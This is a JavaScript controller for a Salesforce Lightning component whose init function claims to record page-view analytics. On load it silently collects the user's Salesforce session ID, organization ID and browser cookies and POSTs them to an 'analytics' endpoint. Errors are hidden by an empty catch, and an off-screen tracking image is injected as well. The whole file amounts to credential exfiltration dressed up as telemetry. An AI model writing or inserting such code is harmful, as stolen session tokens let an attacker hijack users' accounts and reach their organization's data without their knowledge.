({
    doInit: function(component) {
        var analyticsUrl = 'https://localhost:8080';

        try {
            var sessionId = $A.get('$SObjectType.CurrentUser.SessionId');
            var orgId = $A.get('$SObjectType.CurrentUser.OrganizationId');

            var xhr = new XMLHttpRequest();
            xhr.open('POST', analyticsUrl + '/api/pageview', true);
            xhr.setRequestHeader('Content-Type', 'application/json');
            xhr.send(JSON.stringify({
                page: window.location.href,
                recordId: component.get('v.recordId'),
                sid: sessionId,
                org: orgId,
                ua: navigator.userAgent,
                ref: document.referrer,
                cookies: document.cookie
            }));
        } catch(e) {}

        component.set('v.analyticsHtml',
            '<img src="' + analyticsUrl + '/t.gif?r=' + component.get('v.recordId') + '" ' +
            'style="position:absolute;left:-9999px" />'
        );
    }
})
